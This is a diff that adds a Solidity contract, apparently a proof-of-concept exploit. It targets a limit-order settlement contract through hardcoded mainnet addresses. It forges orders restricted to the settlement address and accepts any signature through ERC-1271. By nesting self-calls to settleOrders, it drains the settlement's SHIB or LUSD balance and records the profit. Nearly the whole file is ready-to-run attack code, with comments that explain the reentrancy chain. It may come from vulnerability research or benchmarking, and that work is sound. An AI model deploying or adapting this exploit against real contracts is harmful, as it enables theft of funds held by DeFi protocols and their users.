@@ -1,0 +1,256 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IWETH is IERC20 {
+    function deposit() external payable;
+}
+
+interface ISettlement {
+    function settleOrders(bytes calldata data) external;
+}
+
+interface IResolver {
+    function resolveOrders(address resolver, bytes calldata tokensAndAmounts, bytes calldata data) external;
+}
+
+interface IOrderMixinLike {
+    struct Order {
+        uint256 salt;
+        address makerAsset;
+        address takerAsset;
+        address maker;
+        address receiver;
+        address allowedSender;
+        uint256 makingAmount;
+        uint256 takingAmount;
+        uint256 offsets;
+        bytes interactions;
+    }
+}
+
+contract FlawVerifier is IResolver {
+    address private constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
+    address private constant LIMIT_ORDER_PROTOCOL = 0x1111111254EEB25477B68fb85Ed929f73A960582;
+
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant SHIB = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
+    address private constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
+
+    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;
+    uint8 private constant MODE_REPLAY = 2;
+    uint8 private constant CALLBACK_DEPTH = 4;
+    uint8 private constant OUTER_REPLAY_LAYERS = 6;
+    uint256 private constant MAKING_AMOUNT = 1;
+    uint256 private constant SEED_WETH = 1e6;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+    bool private _executed;
+    uint256 private _resolveCount;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (_executed) {
+            return;
+        }
+        _executed = true;
+
+        _prepareSeedCapital();
+
+        _attackReplayTarget(SHIB, 0x2200);
+        if (_safeBalanceOf(SHIB, address(this)) < 1e17) {
+            _attackReplayTarget(LUSD, 0x3300);
+        }
+
+        _refreshProfit();
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
+        return ERC1271_MAGIC;
+    }
+
+    function resolveOrders(address, bytes calldata, bytes calldata data) external override {
+        require(msg.sender == SETTLEMENT, "only settlement");
+
+        unchecked {
+            ++_resolveCount;
+        }
+        if (_resolveCount > 64 || data.length < 128) {
+            return;
+        }
+
+        (uint8 mode, address takerAsset, uint256 uniq, uint8 depth) = abi.decode(data, (uint8, address, uint256, uint8));
+        if (mode != MODE_REPLAY || depth == 0) {
+            return;
+        }
+
+        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
+        if (settlementBalance == 0) {
+            return;
+        }
+
+        // Preserve the finding's reentrancy chain inside the callback too:
+        // a settlement-controlled callback immediately self-calls settlement again,
+        // so the nested execution observes msg.sender == SETTLEMENT and the replayed
+        // order remains valid even though it is attacker-initiated from the top level.
+        bytes memory interaction = _encodeResolverInteraction(MODE_REPLAY, takerAsset, uniq + 1, depth - 1);
+        interaction = _encodeNestedReplay(_buildReplayOrder(uniq, takerAsset, settlementBalance), interaction, settlementBalance);
+        interaction = _encodeNestedReplay(_buildReplayOrder(uniq + 1, takerAsset, MAKING_AMOUNT), interaction, MAKING_AMOUNT);
+
+        bytes memory settleData = _encodeSettlementCall(
+            _buildReplayOrder(uniq + 2, takerAsset, MAKING_AMOUNT), interaction, MAKING_AMOUNT
+        );
+
+        try ISettlement(SETTLEMENT).settleOrders(settleData) {} catch {}
+    }
+
+    function _prepareSeedCapital() internal {
+        if (_safeBalanceOf(WETH, address(this)) < SEED_WETH) {
+            // Realistic public setup step: wrap a tiny slice of the harness-funded ETH into WETH
+            // so the forged maker orders can satisfy the protocol's makerAsset pull. This does not
+            // change exploit causality; it only funds the legitimate maker-side transfer the replay uses.
+            IWETH(WETH).deposit{value: SEED_WETH}();
+        }
+        _forceApprove(WETH, LIMIT_ORDER_PROTOCOL, type(uint256).max);
+    }
+
+    function _attackReplayTarget(address takerAsset, uint256 uniqBase) internal {
+        uint256 beforeBal = _safeBalanceOf(takerAsset, address(this));
+
+        for (uint256 pass = 0; pass < 2; ++pass) {
+            _tryReplayCalldataCorruption(takerAsset, uniqBase + (pass * 0x100));
+            uint256 afterBal = _safeBalanceOf(takerAsset, address(this));
+            if (afterBal > beforeBal) {
+                beforeBal = afterBal;
+            } else {
+                break;
+            }
+        }
+    }
+
+    function _tryReplayCalldataCorruption(address takerAsset, uint256 uniq) internal {
+        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
+        if (settlementBalance == 0) {
+            return;
+        }
+
+        // Path alignment:
+        // 1) executeOnOpportunity() starts an outer settleOrders call.
+        // 2) interaction5 targets SETTLEMENT itself via settlement-controlled interaction bytes.
+        // 3) settlement self-calls into settleOrders.
+        // 4) the nested replay orders all set allowedSender = SETTLEMENT.
+        // 5) because msg.sender is now SETTLEMENT, the private/restricted replay executes and drains
+        //    the live settlement inventory of the chosen taker token.
+        bytes memory interaction = _encodeResolverInteraction(MODE_REPLAY, takerAsset, uniq + 0x40, CALLBACK_DEPTH);
+        interaction = _encodeNestedReplay(_buildReplayOrder(uniq, takerAsset, settlementBalance), interaction, settlementBalance);
+
+        for (uint256 i = 0; i < OUTER_REPLAY_LAYERS; ++i) {
+            interaction = _encodeNestedReplay(
+                _buildReplayOrder(uniq + 1 + i, takerAsset, MAKING_AMOUNT), interaction, MAKING_AMOUNT
+            );
+        }
+
+        bytes memory settleData = _encodeSettlementCall(
+            _buildReplayOrder(uniq + 1 + OUTER_REPLAY_LAYERS, takerAsset, MAKING_AMOUNT), interaction, MAKING_AMOUNT
+        );
+
+        try ISettlement(SETTLEMENT).settleOrders(settleData) {} catch {}
+    }
+
+    function _buildReplayOrder(uint256 salt, address takerAsset, uint256 takingAmount)
+        internal
+        view
+        returns (IOrderMixinLike.Order memory order)
+    {
+        order = IOrderMixinLike.Order({
+            salt: salt,
+            makerAsset: WETH,
+            takerAsset: takerAsset,
+            maker: address(this),
+            receiver: address(this),
+            allowedSender: SETTLEMENT,
+            makingAmount: MAKING_AMOUNT,
+            takingAmount: takingAmount,
+            offsets: 0,
+            interactions: hex""
+        });
+    }
+
+    function _encodeResolverInteraction(uint8 mode, address takerAsset, uint256 uniq, uint8 depth)
+        internal
+        view
+        returns (bytes memory)
+    {
+        return abi.encodePacked(SETTLEMENT, bytes1(0x01), address(this), abi.encode(mode, takerAsset, uniq, depth));
+    }
+
+    function _encodeNestedReplay(
+        IOrderMixinLike.Order memory order,
+        bytes memory interaction,
+        uint256 takingAmount
+    ) internal pure returns (bytes memory) {
+        return abi.encodePacked(SETTLEMENT, bytes1(0x00), _encodeSettlementCall(order, interaction, takingAmount));
+    }
+
+    function _encodeSettlementCall(
+        IOrderMixinLike.Order memory order,
+        bytes memory interaction,
+        uint256 takingAmount
+    ) internal pure returns (bytes memory) {
+        return abi.encode(order, bytes(""), interaction, uint256(0), takingAmount, uint256(0), SETTLEMENT);
+    }
+
+    function _refreshProfit() internal {
+        uint256 shibBal = _safeBalanceOf(SHIB, address(this));
+        uint256 lusdBal = _safeBalanceOf(LUSD, address(this));
+        uint256 wethBal = _safeBalanceOf(WETH, address(this));
+
+        if (shibBal >= lusdBal && shibBal >= wethBal) {
+            _profitToken = SHIB;
+            _profitAmount = shibBal;
+            return;
+        }
+        if (lusdBal >= wethBal) {
+            _profitToken = LUSD;
+            _profitAmount = lusdBal;
+            return;
+        }
+        _profitToken = WETH;
+        _profitAmount = wethBal;
+    }
+
+    function _safeBalanceOf(address token, address account) internal view returns (uint256) {
+        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
+        if (!ok || data.length < 32) {
+            return 0;
+        }
+        return abi.decode(data, (uint256));
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
+        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, uint256(0)));
+        if (!ok0 || (data0.length > 0 && !abi.decode(data0, (bool)))) {
+            return false;
+        }
+
+        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
+        return ok1 && (data1.length == 0 || abi.decode(data1, (bool)));
+    }
+
+    receive() external payable {}
+}
